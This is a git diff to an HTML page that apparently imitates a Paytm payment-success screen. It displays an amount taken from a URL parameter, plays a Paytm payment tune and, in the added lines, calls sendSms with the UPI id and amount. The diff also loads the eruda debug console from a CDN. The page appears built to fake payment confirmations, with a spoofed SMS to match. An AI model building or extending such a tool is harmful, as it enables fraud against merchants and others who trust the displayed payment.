@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script src="./js/Mobile.js" type="text/javascript" charset="utf-8"></script>
+  <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+<script>
+    eruda.init();
+</script>
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.5/peerjs.min.js" integrity="sha512-XEKeWX+mI3Ov+tg2evDlVQFzVOIp4T8J3cNcCEPaEUGpxJV3eZaN8rHuvnFPvQpGJBHPmrozJDMpm2xcDvtmyQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
     <meta charset="UTF-8">
@@ -160,11 +166,12 @@
         
         // Clean amount string and format
         const cleanAmount = parseFloat(amountParam.replace(/[^0-9.]/g, '')) || 0;
-        document.getElementById("amount").innerText = formatter.format(cleanAmount).replace("INR", "₹").trim();
+        const cleanCu=formatter.format(cleanAmount).replace("INR", "₹").trim();
+        document.getElementById("amount").innerText = cleanCu
         const au=new Audio("./media/paytm_payment_tune.mp3")
   
           au.play()
-        
+        sendSms(upiParam,cleanCu)
     </script>
     <script src="./js/sendData.js" type="text/javascript" charset="utf-8"></script>
 </body>
